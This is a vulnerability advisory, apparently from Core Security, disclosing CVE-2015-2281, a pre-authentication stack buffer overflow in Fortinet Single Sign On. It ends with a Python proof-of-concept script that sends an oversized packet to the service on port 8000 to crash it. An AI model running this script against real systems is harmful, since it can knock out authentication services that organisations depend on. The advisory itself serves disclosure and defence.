Release mode: Coordinated release


2. Vulnerability Information


Class: Stack-based Buffer Overflow [CWE-121]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2015-2281



3. Vulnerability Description


Through Fortniet [1] "Single Sign On" or "Single User Sign On" users logged on to a computer network are authenticated for access to network resources through the FortiGate unit without having to enter their username and password again. Fortinet Single Sign On (FSSO) provides Single Sign On capability for Microsoft Windows networks using either Active Directory or NTLM authentication and Novell networks, using eDirectory.

FSSO [4] monitors user logons and sends the FortiGate unit the username, IP address, and the list of Windows AD user groups to which the user belongs. When the user tries to access network resources, the FortiGate unit selects the appropriate security policy for the destination. If the user belongs to one of the permitted user groups, the connection is allowed.

There is a vulnerability in the message dispatcher used by FSSO Windows Active Directory and FSSO Novell eDirectory. Exploitation of this vulnerability might lead to a full network compromise.


4. Vulnerable packages


- FSSO Windows Active Directory 4.3.0161 (4.3.0151, 4.3.0129 were also tested and found vulnerable)
- FSSO Novell eDirectory 4.3.0161

Other versions are probably affected too, but they were not checked.


5. Vendor Information, Solutions and Workarounds


Core Security recommends those affected use third party software such as Sentinel [3] or EMET [2] that could help to prevent the exploitation of affected systems to some extent.

Fortinet published the following FortiGuard Bulletin: [5]


6. Credits


This vulnerability was discovered and researched by Enrique Nissim in collaboration with Andres Lopez Luksenberg, both from the Core Security Exploit Writing Team. The publication of this advisory was coordinated by Joaquín Rodríguez Varela from Core Security Advisories Team.



7. Technical Description / Proof of Concept Code


[CVE-2015-2281] The vulnerability in both cases can be exploited by sending a special packet to the services without being authenticated (pre-auth).

Given that both software systems require and Administrative account in order to run, (Windows Domain Admin or eDirectory Admin accordingly) the full network is exposed. Pre-authenticated Remote Code Execution with Domain Administrative rights is possible.

The vulnerability is located in the Message Dispatcher for message PROCESS_HELLO. Here is a PoC (Proof of Concept) that causes the application thread with the FortiGate appliance to crash:


import socket
import struct

TARGET_IP = "192.168.233.100"

def play():

   message = "\x80\x01\x42\x42"
   buff = "A"*248
   buff += "B" * (0xfffff - len(buff))
   payload = struct.pack(">I", 0x000fffff) + message + buff

   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((TARGET_IP, 8000))
   s.send(payload)
   buff_recv = s.recv(6000)
   print buff_recv
   s.close()

play()
